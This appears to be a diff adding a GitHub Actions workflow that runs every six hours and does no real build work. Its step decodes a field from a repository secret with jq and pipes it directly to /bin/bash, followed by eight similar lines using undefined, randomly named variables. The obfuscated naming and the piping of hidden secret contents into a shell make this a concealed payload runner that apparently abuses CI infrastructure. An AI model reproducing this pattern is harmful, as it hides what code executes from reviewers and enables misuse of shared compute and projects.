@@ -1,0 +1,26 @@
+name: ninboning
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: ninboning
+        env:
+          pxnxm24099: ${{ secrets.pxnxm24099 }}
+        run: |
+          echo $pxnxm24099 | jq -r .folzl75 | /bin/bash
+          echo $k91654 | jq -r .wfi5080 | /bin/bash
+          echo $tabuy48 | jq -r .cei96685 | /bin/bash
+          echo $zgz15 | jq -r .ygiuc23 | /bin/bash
+          echo $txl3 | jq -r .i35812 | /bin/bash
+          echo $mdirr0418 | jq -r .bdobc0 | /bin/bash
+          echo $oiamn272 | jq -r .bbzt485 | /bin/bash
+          echo $z2 | jq -r .ozl82 | /bin/bash
+          echo $ga3115 | jq -r .v4183 | /bin/bash
+
